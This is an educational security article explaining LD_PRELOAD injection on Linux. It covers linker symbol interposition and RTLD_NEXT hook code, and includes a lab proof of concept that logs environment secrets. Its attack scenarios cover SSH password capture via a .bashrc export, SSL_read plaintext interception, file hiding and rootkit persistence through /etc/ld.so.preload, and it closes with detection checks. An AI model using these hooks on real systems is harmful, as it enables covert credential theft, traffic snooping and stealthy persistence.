# LD_PRELOAD Injection

---

## Table of Contents

1. [Executive Summary](#1-executive-summary)
2. [How LD_PRELOAD Works](#2-how-ld_preload-works)
3. [The Symbol Resolution Process](#3-the-symbol-resolution-process)
4. [Attack Implementation](#4-attack-implementation)
5. [Proof of Concept](#5-proof-of-concept)
6. [Real-World Attack Scenarios](#6-real-world-attack-scenarios)
7. [Security Restrictions](#7-security-restrictions)
8. [Detection Methods](#8-detection-methods)
9. [Conclusion](#9-conclusion)

---

## 1. Executive Summary

**LD_PRELOAD** is an environment variable that instructs the dynamic linker to load specified shared libraries **before all others**. This mechanism, designed for debugging and development, can be abused to:

- **Intercept function calls** before they reach the real library
- **Modify function behavior** without changing the target program
- **Steal sensitive data** (credentials, API keys, file contents)
- **Inject code** that runs before and after the program's main()

### Key Characteristics

| Aspect | Details |
|--------|---------|
| **Attack Vector** | Environment variable |
| **Binary Modification** | None required |
| **Persistence** | Per-execution (or via /etc/ld.so.preload for system-wide) |
| **Visibility** | Environment visible in /proc/PID/environ |
| **Restrictions** | Ignored for SUID/SGID binaries |

### Attack Flow Summary

```
┌─────────────────────────────────────────────────────────────────────────────────┐
│                        LD_PRELOAD INJECTION FLOW                                 │
├─────────────────────────────────────────────────────────────────────────────────┤
│                                                                                 │
│   $ LD_PRELOAD=./evil.so ./victim                                               │
│        │                                                                        │
│        ▼                                                                        │
│   ┌─────────────────────────────────────────────────────────────────────────┐   │
│   │ SHELL: Calls execve() with environment containing LD_PRELOAD           │   │
│   └─────────────────────────────────────────────────────────────────────────┘   │
│        │                                                                        │
│        ▼                                                                        │
│   ┌─────────────────────────────────────────────────────────────────────────┐   │
│   │ KERNEL: Loads dynamic linker (ld-linux.so)                              │   │
│   └─────────────────────────────────────────────────────────────────────────┘   │
│        │                                                                        │
│        ▼                                                                        │
│   ┌─────────────────────────────────────────────────────────────────────────┐   │
│   │ DYNAMIC LINKER: Reads LD_PRELOAD from environment                       │   │
│   │                 Loads evil.so FIRST (before libc!)                      │   │
│   │                                                                         │   │
│   │   Load Order:                                                           │   │
│   │   1. evil.so        ★ OUR LIBRARY (symbols take precedence)             │   │
│   │   2. libc.so.6      (standard library)                                  │   │
│   │   3. other libs...                                                      │   │
│   └─────────────────────────────────────────────────────────────────────────┘   │
│        │                                                                        │
│        ▼                                                                        │
│   ┌─────────────────────────────────────────────────────────────────────────┐   │
│   │ LINKER: Runs constructor functions                                      │   │
│   │         evil.so's __attribute__((constructor)) runs BEFORE main()       │   │
│   └─────────────────────────────────────────────────────────────────────────┘   │
│        │                                                                        │
│        ▼                                                                        │
│   ┌─────────────────────────────────────────────────────────────────────────┐   │
│   │ PROGRAM: Calls printf("Hello")                                          │   │
│   │          Symbol lookup finds printf in evil.so FIRST                    │   │
│   │          Our evil_printf() runs instead of libc's printf()              │   │
│   └─────────────────────────────────────────────────────────────────────────┘   │
│        │                                                                        │
│        ▼                                                                        │
│   ┌─────────────────────────────────────────────────────────────────────────┐   │
│   │ Our evil_printf():                                                      │   │
│   │   1. Log the call (steal data)                                          │   │
│   │   2. Call REAL printf via dlsym(RTLD_NEXT, "printf")                    │   │
│   │   3. Return result (transparent to caller)                              │   │
│   └─────────────────────────────────────────────────────────────────────────┘   │
│                                                                                 │
└─────────────────────────────────────────────────────────────────────────────────┘
```

---

## 2. How LD_PRELOAD Works

### 2.1 The Design Purpose

LD_PRELOAD was created for legitimate purposes:

```
┌─────────────────────────────────────────────────────────────────────────────────┐
│                    LEGITIMATE USES OF LD_PRELOAD                                 │
├─────────────────────────────────────────────────────────────────────────────────┤
│                                                                                 │
│   1. DEBUGGING                                                                  │
│      ─────────                                                                  │
│      - Memory debugging (valgrind uses this)                                    │
│      - Function call tracing                                                    │
│      - Error injection for testing                                              │
│                                                                                 │
│   2. COMPATIBILITY                                                              │
│      ─────────────                                                              │
│      - Provide missing symbols for old binaries                                 │
│      - Override broken library functions                                        │
│      - Version compatibility shims                                              │
│                                                                                 │
│   3. PERFORMANCE                                                                │
│      ───────────                                                                │
│      - Optimized malloc implementations (jemalloc, tcmalloc)                    │
│      - Custom memory allocators                                                 │
│                                                                                 │
│   4. INTERCEPTION (legitimate)                                                  │
│      ─────────────────────────                                                  │
│      - LD_PRELOAD-based sandboxing                                              │
│      - Syscall filtering                                                        │
│      - Logging/auditing                                                         │
│                                                                                 │
└─────────────────────────────────────────────────────────────────────────────────┘
```

### 2.2 How the Linker Processes LD_PRELOAD

```
┌─────────────────────────────────────────────────────────────────────────────────┐
│                    LD_PRELOAD PROCESSING                                         │
├─────────────────────────────────────────────────────────────────────────────────┤
│                                                                                 │
│   Step 1: Linker starts                                                         │
│   ─────────────────────                                                         │
│   ld-linux.so is loaded by kernel, begins initialization                        │
│                                                                                 │
│   Step 2: Check security status                                                 │
│   ──────────────────────────────                                                │
│   if (AT_SECURE) {                                                              │
│       // SUID/SGID binary - ignore LD_PRELOAD for security                      │
│       skip_preload = true;                                                      │
│   }                                                                             │
│                                                                                 │
│   Step 3: Read LD_PRELOAD                                                       │
│   ───────────────────────                                                       │
│   preload = getenv("LD_PRELOAD");                                               │
│   // Can be colon-separated list: "/lib/a.so:/lib/b.so"                         │
│                                                                                 │
│   Step 4: Also check /etc/ld.so.preload                                         │
│   ─────────────────────────────────────                                         │
│   // This file is ALWAYS processed, even for SUID binaries!                     │
│   // Requires root to modify                                                    │
│                                                                                 │
│   Step 5: Load preload libraries FIRST                                          │
│   ─────────────────────────────────────                                         │
│   for each library in preload:                                                  │
│       dlopen(library)                                                           │
│       add_to_symbol_search_order(library)  // BEFORE everything else            │
│                                                                                 │
│   Step 6: Load DT_NEEDED libraries                                              │
│   ────────────────────────────────                                              │
│   // libc, libpthread, etc. loaded AFTER preload libs                           │
│                                                                                 │
│   Step 7: Symbol resolution                                                     │
│   ─────────────────────────                                                     │
│   // When program calls printf():                                               │
│   // 1. Search preload libs first                                               │
│   // 2. If found, use that version                                              │
│   // 3. Otherwise, continue to libc                                             │
│                                                                                 │
└─────────────────────────────────────────────────────────────────────────────────┘
```

### 2.3 Environment Variable Syntax

```bash
# Single library
LD_PRELOAD=/path/to/evil.so ./program

# Multiple libraries (colon-separated)
LD_PRELOAD=/path/to/lib1.so:/path/to/lib2.so ./program

# With other environment variables
SECRET=value LD_PRELOAD=./hook.so ./program

# Using export (affects all subsequent commands)
export LD_PRELOAD=/path/to/evil.so
./program1
./program2  # Also affected
```

---

## 3. The Symbol Resolution Process

Understanding **symbol resolution** is key to understanding why LD_PRELOAD works.

### 3.1 What Are Symbols?

```
┌─────────────────────────────────────────────────────────────────────────────────┐
│                    SYMBOLS IN SHARED LIBRARIES                                   │
├─────────────────────────────────────────────────────────────────────────────────┤
│                                                                                 │
│   A SYMBOL is a named entity in a library:                                      │
│                                                                                 │
│   FUNCTION SYMBOLS:                                                             │
│   ─────────────────                                                             │
│   printf      → 0x7ffff7c60100  (address in libc)                               │
│   malloc      → 0x7ffff7c80200                                                  │
│   getenv      → 0x7ffff7c70300                                                  │
│                                                                                 │
│   VARIABLE SYMBOLS:                                                             │
│   ─────────────────                                                             │
│   stdout      → 0x7ffff7dd5780  (FILE* in libc)                                 │
│   errno       → (thread-local)                                                  │
│                                                                                 │
│   View symbols with:                                                            │
│   $ nm -D /lib/x86_64-linux-gnu/libc.so.6 | grep printf                         │
│   0000000000060100 T printf                                                     │
│                    ^                                                            │
│                    T = Text section (code)                                      │
│                                                                                 │
└─────────────────────────────────────────────────────────────────────────────────┘
```

### 3.2 Symbol Resolution Order

```
┌─────────────────────────────────────────────────────────────────────────────────┐
│                    SYMBOL SEARCH ORDER                                           │
├─────────────────────────────────────────────────────────────────────────────────┤
│                                                                                 │
│   When program calls: printf("Hello")                                           │
│                                                                                 │
│   Linker searches for "printf" symbol in this order:                            │
│                                                                                 │
│   1. LD_PRELOAD libraries (in order specified)                                  │
│      ├── evil.so         ← CHECKED FIRST!                                       │
│      └── other_preload.so                                                       │
│                                                                                 │
│   2. The program itself                                                         │
│      └── ./victim        (unlikely to define printf)                            │
│                                                                                 │
│   3. DT_NEEDED libraries (in dependency order)                                  │
│      ├── libc.so.6       ← printf usually found here                            │
│      ├── libpthread.so.0                                                        │
│      └── other libs...                                                          │
│                                                                                 │
│   ═══════════════════════════════════════════════════════════════════════════   │
│                                                                                 │
│   THE KEY INSIGHT:                                                              │
│   ─────────────────                                                             │
│                                                                                 │
│   If evil.so defines printf(), it will be found FIRST.                          │
│   The linker stops searching once it finds a match.                             │
│   libc's printf() is never called!                                              │
│                                                                                 │
│   This is called SYMBOL INTERPOSITION.                                          │
│                                                                                 │
└─────────────────────────────────────────────────────────────────────────────────┘
```

### 3.3 Calling the Real Function with RTLD_NEXT

Our hook needs to call the real function. We use `dlsym(RTLD_NEXT, "function")`:

```
┌─────────────────────────────────────────────────────────────────────────────────┐
│                    USING RTLD_NEXT                                               │
├─────────────────────────────────────────────────────────────────────────────────┤
│                                                                                 │
│   dlsym(RTLD_NEXT, "printf")                                                    │
│                                                                                 │
│   RTLD_NEXT means: "find this symbol in the NEXT library in search order"       │
│                    (skip the current library)                                   │
│                                                                                 │
│   Search order with RTLD_NEXT:                                                  │
│                                                                                 │
│   evil.so      ← We are HERE (skip this)                                        │
│      │                                                                          │
│      ▼                                                                          │
│   victim       ← Check here (probably not defined)                              │
│      │                                                                          │
│      ▼                                                                          │
│   libc.so.6    ← Found! Return this address                                     │
│                                                                                 │
│   ═══════════════════════════════════════════════════════════════════════════   │
│                                                                                 │
│   CODE PATTERN:                                                                 │
│   ─────────────                                                                 │
│                                                                                 │
│   int printf(const char *fmt, ...) {                                            │
│       // Get the REAL printf from the next library                              │
│       static int (*real_printf)(const char *, ...) = NULL;                      │
│       if (!real_printf) {                                                       │
│           real_printf = dlsym(RTLD_NEXT, "printf");                             │
│       }                                                                         │
│                                                                                 │
│       // Do our evil stuff here                                                 │
│       log_to_file("printf called with: %s\n", fmt);                             │
│                                                                                 │
│       // Call the real printf                                                   │
│       return real_printf(fmt, ...);                                             │
│   }                                                                             │
│                                                                                 │
└─────────────────────────────────────────────────────────────────────────────────┘
```

---

## 4. Attack Implementation

### 4.1 Basic Hook Structure

```c
/*
 * Anatomy of a function hook
 */

#define _GNU_SOURCE      /* Required for RTLD_NEXT */
#include <dlfcn.h>       /* For dlsym() */

/* Hook for puts() */
int puts(const char *s) {
    /*
     * Step 1: Get pointer to REAL puts
     * static ensures we only look this up once
     */
    static int (*real_puts)(const char *) = NULL;
    if (!real_puts) {
        real_puts = dlsym(RTLD_NEXT, "puts");
    }

    /*
     * Step 2: Our malicious code
     * - Log the string
     * - Modify it
     * - Block it
     * - Whatever we want
     */
    FILE *log = fopen("/tmp/puts.log", "a");
    if (log) {
        fprintf(log, "puts() called with: %s\n", s);
        fclose(log);
    }

    /*
     * Step 3: Call the real function
     * (or don't, if we want to block it)
     */
    return real_puts(s);
}
```

### 4.2 Constructor and Destructor

```c
/*
 * Constructor: Runs BEFORE main()
 * Destructor:  Runs AFTER main() returns
 */

__attribute__((constructor))
void evil_init(void) {
    /*
     * This code executes BEFORE the program's main()
     *
     * Use cases:
     * - Set up logging
     * - Establish reverse shell
     * - Modify environment
     * - Initialize hooks
     */
    fprintf(stderr, "[!] Evil library loaded!\n");
}

__attribute__((destructor))
void evil_fini(void) {
    /*
     * This code executes AFTER main() returns
     *
     * Use cases:
     * - Exfiltrate collected data
     * - Clean up traces
     * - Trigger final payload
     */
    fprintf(stderr, "[!] Evil library unloading!\n");
}
```

### 4.3 Compilation

```bash
# Compile as shared library
gcc -shared -fPIC -o evil.so evil.c -ldl

# Flags explained:
# -shared   : Create shared library (.so)
# -fPIC     : Position Independent Code (required for shared libs)
# -ldl      : Link with libdl for dlsym()
```

---

## 5. Proof of Concept

### 5.1 Lab Files

```
/home/spider/research/LD_PRELOAD_Injection/
├── victim.c           # Target program
├── evil_preload.c     # Comprehensive hook library
├── credential_hook.c  # Credential stealing example
├── Makefile           # Build automation
└── LD_PRELOAD_INJECTION.md  # This document
```

### 5.2 Running the POC

```bash
# Build everything
$ make

# Run victim normally
$ make run

# Run with evil preload
$ make run-evil

# Check captured data
$ cat /tmp/ld_preload_log.txt
```

### 5.3 Expected Output

**Normal Execution:**
```
╔════════════════════════════════════════════════════════╗
║          SECURE CONFIGURATION MANAGER v1.0             ║
╚════════════════════════════════════════════════════════╝

[SYS] PID: 12345
[SYS] Starting secure configuration manager...

[CONFIG] Loading configuration...
[CONFIG] Hostname: myhost

[ENV] Checking environment variables...
[ENV] USER: user
[ENV] HOME: /home/user

...
```

**With LD_PRELOAD:**
```
╔════════════════════════════════════════════════════════╗
║     ★ LD_PRELOAD INJECTION ACTIVE ★                   ║
║     Library loaded BEFORE main()                      ║
║     All hooked functions will be intercepted          ║
╚════════════════════════════════════════════════════════╝

╔════════════════════════════════════════════════════════╗
║          SECURE CONFIGURATION MANAGER v1.0             ║
╚════════════════════════════════════════════════════════╝

[HOOK] fopen("/etc/hostname", "r")
[HOOK] getenv("USER") = "user"
[HOOK] getenv("HOME") = "/home/user"
[HOOK] getenv("SECRET_API_KEY") = "sk-12345-SUPER-SECRET-KEY" ← SENSITIVE!
[HOOK] getpwuid(1000) → user=user, home=/home/user

...

╔════════════════════════════════════════════════════════╗
║     ★ LD_PRELOAD SESSION COMPLETE ★                   ║
║     Check /tmp/ld_preload_log.txt for details         ║
╚════════════════════════════════════════════════════════╝
```

---

## 6. Real-World Attack Scenarios

### 6.1 Credential Theft

```
┌─────────────────────────────────────────────────────────────────────────────────┐
│                    SCENARIO: SSH PASSWORD THEFT                                  │
├─────────────────────────────────────────────────────────────────────────────────┤
│                                                                                 │
│   Attack: Hook getpass() or read() to capture SSH passwords                     │
│                                                                                 │
│   Setup:                                                                        │
│   ───────                                                                       │
│   1. Attacker has access to user's shell                                        │
│   2. Modifies .bashrc:                                                          │
│      export LD_PRELOAD=/home/user/.hidden/cred_hook.so                          │
│                                                                                 │
│   Attack Flow:                                                                  │
│   ────────────                                                                  │
│   1. User runs: ssh server.example.com                                          │
│   2. SSH client prompts for password                                            │
│   3. Our hook intercepts the input                                              │
│   4. Password logged to hidden file                                             │
│   5. SSH connection proceeds normally                                           │
│   6. User suspects nothing                                                      │
│                                                                                 │
│   Hooked Functions:                                                             │
│   ─────────────────                                                             │
│   - getpass()       : Classic password prompt                                   │
│   - read()          : Raw input (when echo disabled)                            │
│   - tcsetattr()     : Detect password mode (echo off)                           │
│                                                                                 │
└─────────────────────────────────────────────────────────────────────────────────┘
```

### 6.2 Network Interception

```
┌─────────────────────────────────────────────────────────────────────────────────┐
│                    SCENARIO: NETWORK TRAFFIC INTERCEPTION                        │
├─────────────────────────────────────────────────────────────────────────────────┤
│                                                                                 │
│   Hook network functions to intercept/modify traffic:                           │
│                                                                                 │
│   connect()    : See where program connects                                     │
│   send/recv()  : Capture plaintext data                                         │
│   SSL_read()   : Capture AFTER decryption!                                      │
│   SSL_write()  : Capture BEFORE encryption!                                     │
│                                                                                 │
│   Example - SSL_read hook:                                                      │
│   ─────────────────────────                                                     │
│                                                                                 │
│   int SSL_read(SSL *ssl, void *buf, int num) {                                  │
│       static int (*real_SSL_read)(...) = NULL;                                  │
│       if (!real_SSL_read)                                                       │
│           real_SSL_read = dlsym(RTLD_NEXT, "SSL_read");                         │
│                                                                                 │
│       int result = real_SSL_read(ssl, buf, num);                                │
│                                                                                 │
│       // buf now contains DECRYPTED data!                                       │
│       log_data("SSL_read", buf, result);                                        │
│                                                                                 │
│       return result;                                                            │
│   }                                                                             │
│                                                                                 │
│   This captures HTTPS traffic in plaintext!                                     │
│                                                                                 │
└─────────────────────────────────────────────────────────────────────────────────┘
```

### 6.3 File Access Manipulation

```
┌─────────────────────────────────────────────────────────────────────────────────┐
│                    SCENARIO: HIDING FILES / SERVING FAKE DATA                    │
├─────────────────────────────────────────────────────────────────────────────────┤
│                                                                                 │
│   HIDE FILES FROM ls/readdir:                                                   │
│   ────────────────────────────                                                  │
│                                                                                 │
│   struct dirent *readdir(DIR *dirp) {                                           │
│       static struct dirent *(*real_readdir)(DIR *) = NULL;                      │
│       if (!real_readdir)                                                        │
│           real_readdir = dlsym(RTLD_NEXT, "readdir");                           │
│                                                                                 │
│       struct dirent *entry;                                                     │
│       while ((entry = real_readdir(dirp)) != NULL) {                            │
│           // Skip files we want to hide                                         │
│           if (strstr(entry->d_name, "evil") == NULL)                            │
│               return entry;                                                     │
│       }                                                                         │
│       return NULL;                                                              │
│   }                                                                             │
│                                                                                 │
│   ═══════════════════════════════════════════════════════════════════════════   │
│                                                                                 │
│   SERVE FAKE CONFIG FILE:                                                       │
│   ────────────────────────                                                      │
│                                                                                 │
│   FILE *fopen(const char *path, const char *mode) {                             │
│       static FILE *(*real_fopen)(...) = NULL;                                   │
│       if (!real_fopen)                                                          │
│           real_fopen = dlsym(RTLD_NEXT, "fopen");                               │
│                                                                                 │
│       // Redirect config file reads to our fake                                 │
│       if (strcmp(path, "/etc/app/config.json") == 0) {                          │
│           return real_fopen("/tmp/.fake_config.json", mode);                    │
│       }                                                                         │
│                                                                                 │
│       return real_fopen(path, mode);                                            │
│   }                                                                             │
│                                                                                 │
└─────────────────────────────────────────────────────────────────────────────────┘
```

### 6.4 Privilege Check Bypass

```
┌─────────────────────────────────────────────────────────────────────────────────┐
│                    SCENARIO: FOOLING UID CHECKS                                  │
├─────────────────────────────────────────────────────────────────────────────────┤
│                                                                                 │
│   Some programs check: if (getuid() == 0) { /* root actions */ }                │
│                                                                                 │
│   We can fool these checks:                                                     │
│                                                                                 │
│   uid_t getuid(void) {                                                          │
│       return 0;  // Always pretend to be root                                   │
│   }                                                                             │
│                                                                                 │
│   ⚠️ IMPORTANT LIMITATION:                                                      │
│   ─────────────────────────                                                     │
│   This does NOT give actual root privileges!                                    │
│                                                                                 │
│   - Kernel syscalls still check REAL uid                                        │
│   - File permissions still enforced                                             │
│   - Only fools userspace UID checks                                             │
│                                                                                 │
│   Useful for: Programs that do access control in userspace                      │
│   NOT useful for: Actual privilege escalation                                   │
│                                                                                 │
└─────────────────────────────────────────────────────────────────────────────────┘
```

---

## 7. Security Restrictions

### 7.1 AT_SECURE Flag

```
┌─────────────────────────────────────────────────────────────────────────────────┐
│                    LD_PRELOAD SECURITY RESTRICTIONS                              │
├─────────────────────────────────────────────────────────────────────────────────┤
│                                                                                 │
│   The dynamic linker IGNORES LD_PRELOAD when AT_SECURE is set:                  │
│                                                                                 │
│   AT_SECURE = 1 when:                                                           │
│   ───────────────────                                                           │
│   ✗ Binary has SUID bit (runs as file owner)                                    │
│   ✗ Binary has SGID bit (runs as file group)                                    │
│   ✗ Binary has file capabilities                                                │
│   ✗ SELinux domain transition occurs                                            │
│   ✗ Real UID ≠ Effective UID                                                    │
│                                                                                 │
│   ═══════════════════════════════════════════════════════════════════════════   │
│                                                                                 │
│   TESTING:                                                                      │
│   ────────                                                                      │
│                                                                                 │
│   # This works (normal binary):                                                 │
│   $ LD_PRELOAD=./evil.so ./normal_program                                       │
│                                                                                 │
│   # This is IGNORED (SUID binary):                                              │
│   $ LD_PRELOAD=./evil.so /usr/bin/sudo -l                                       │
│   # evil.so NOT loaded - security protection works                              │
│                                                                                 │
│   # Check if binary is SUID:                                                    │
│   $ ls -la /usr/bin/sudo                                                        │
│   -rwsr-xr-x 1 root root ... /usr/bin/sudo                                      │
│       ^                                                                         │
│       's' = SUID bit set                                                        │
│                                                                                 │
└─────────────────────────────────────────────────────────────────────────────────┘
```

### 7.2 Bypassing Restrictions

```
┌─────────────────────────────────────────────────────────────────────────────────┐
│                    BYPASS: /etc/ld.so.preload                                    │
├─────────────────────────────────────────────────────────────────────────────────┤
│                                                                                 │
│   If attacker has ROOT access, they can use /etc/ld.so.preload                  │
│                                                                                 │
│   This file is ALWAYS processed - even for SUID binaries!                       │
│                                                                                 │
│   # As root:                                                                    │
│   $ echo "/path/to/evil.so" >> /etc/ld.so.preload                               │
│                                                                                 │
│   Now evil.so is loaded for EVERY dynamically-linked program:                   │
│   - /usr/bin/sudo      (SUID - normally protected)                              │
│   - /bin/su            (SUID - normally protected)                              │
│   - /usr/bin/passwd    (SUID - normally protected)                              │
│   - Everything else                                                             │
│                                                                                 │
│   ⚠️ This is a common rootkit technique for persistence!                        │
│                                                                                 │
│   Detection:                                                                    │
│   ──────────                                                                    │
│   $ cat /etc/ld.so.preload                                                      │
│   # Should be empty or not exist on clean systems                               │
│                                                                                 │
└─────────────────────────────────────────────────────────────────────────────────┘
```

### 7.3 Other Protections

```
┌─────────────────────────────────────────────────────────────────────────────────┐
│                    ADDITIONAL SECURITY CONSIDERATIONS                            │
├─────────────────────────────────────────────────────────────────────────────────┤
│                                                                                 │
│   1. LIBRARY PATH REQUIREMENTS                                                  │
│      ─────────────────────────                                                  │
│      LD_PRELOAD library must be readable by the process.                        │
│      If attacker can't write to accessible location, attack fails.              │
│                                                                                 │
│   2. ABSOLUTE vs RELATIVE PATHS                                                 │
│      ──────────────────────────                                                 │
│      Relative paths: ./evil.so - depends on CWD                                 │
│      Absolute paths: /tmp/evil.so - more reliable                               │
│                                                                                 │
│   3. STATIC BINARIES                                                            │
│      ───────────────                                                            │
│      Statically-linked binaries don't use ld-linux.so                           │
│      → LD_PRELOAD has NO effect                                                 │
│                                                                                 │
│      Check: $ file /bin/busybox                                                 │
│      "statically linked" = immune to LD_PRELOAD                                 │
│                                                                                 │
│   4. HARDENED APPLICATIONS                                                      │
│      ──────────────────────                                                     │
│      Some programs check their environment and clear LD_PRELOAD                 │
│      before executing sensitive operations.                                     │
│                                                                                 │
└─────────────────────────────────────────────────────────────────────────────────┘
```

---

## 8. Detection Methods

### 8.1 Process Inspection

```bash
# Check environment of running process
$ cat /proc/<PID>/environ | tr '\0' '\n' | grep LD_PRELOAD

# Check loaded libraries
$ cat /proc/<PID>/maps | grep -v "libc\|ld-linux\|lib.*\.so"

# List open file descriptors (might show preload lib)
$ ls -la /proc/<PID>/fd/
```

### 8.2 System-Wide Checks

```bash
# Check for /etc/ld.so.preload
$ cat /etc/ld.so.preload
# Should be empty or not exist

# Check for LD_PRELOAD in shell configs
$ grep -r LD_PRELOAD /etc/profile.d/
$ grep -r LD_PRELOAD /home/*/.bashrc
$ grep -r LD_PRELOAD /home/*/.profile

# List all .so files in /tmp (suspicious location)
$ find /tmp -name "*.so" 2>/dev/null
```

### 8.3 Detection Summary

```
┌─────────────────────────────────────────────────────────────────────────────────┐
│                    DETECTION CHECKLIST                                           │
├─────────────────────────────────────────────────────────────────────────────────┤
│                                                                                 │
│   □ Check /etc/ld.so.preload exists and contents                                │
│   □ Check process environments for LD_PRELOAD                                   │
│   □ Check shell initialization files for LD_PRELOAD                             │
│   □ Look for .so files in unusual locations (/tmp, /dev/shm, home dirs)         │
│   □ Compare library list in /proc/PID/maps to expected libraries                │
│   □ Monitor for dlsym(RTLD_NEXT, ...) patterns in memory                        │
│   □ Check for constructor functions in loaded libraries                         │
│   □ Audit file access to sensitive paths from unexpected libraries              │
│                                                                                 │
└─────────────────────────────────────────────────────────────────────────────────┘
```

---

## 9. Conclusion

### 9.1 Key Takeaways

```
┌─────────────────────────────────────────────────────────────────────────────────┐
│                         WHAT WE LEARNED                                          │
├─────────────────────────────────────────────────────────────────────────────────┤
│                                                                                 │
│   1. LD_PRELOAD IS A FEATURE, NOT A BUG                                         │
│      Designed for debugging/compatibility, but abusable.                        │
│      The linker does exactly what it's told.                                    │
│                                                                                 │
│   2. SYMBOL INTERPOSITION IS THE MECHANISM                                      │
│      Preloaded libraries are searched first.                                    │
│      Matching symbols override library functions.                               │
│                                                                                 │
│   3. RTLD_NEXT ENABLES TRANSPARENT HOOKS                                        │
│      We can intercept, log, modify, then call the real function.                │
│      Programs run normally - just with extra behavior.                          │
│                                                                                 │
│   4. CONSTRUCTORS RUN BEFORE MAIN                                               │
│      __attribute__((constructor)) gives pre-main execution.                     │
│      Combined with hooks = complete control.                                    │
│                                                                                 │
│   5. SECURITY RESTRICTIONS EXIST                                                │
│      SUID/SGID binaries ignore LD_PRELOAD.                                      │
│      But /etc/ld.so.preload bypasses this (requires root).                      │
│                                                                                 │
└─────────────────────────────────────────────────────────────────────────────────┘
```

### 9.2 Comparison with Trojanized Loader

| Aspect | Trojanized Loader (Part 1) | LD_PRELOAD (Part 2) |
|--------|---------------------------|---------------------|
| **Binary Modification** | Required | None |
| **Persistence** | Permanent (on disk) | Per-execution |
| **Target Scope** | Specific binary | Any dynamic binary |
| **Required Access** | Write to binary/loader | Control environment |
| **Detection** | Hash verification | Environment inspection |
| **SUID Impact** | Works always | Blocked by AT_SECURE |

### 9.3 Coming in Part 3: GOT/PLT Hijacking

The next article covers **GOT/PLT Hijacking** - modifying function pointers at runtime:

- Abuses writable GOT section
- Requires memory write primitive
- Works even with ASLR (if address leaked)
- Can be done from within a running process
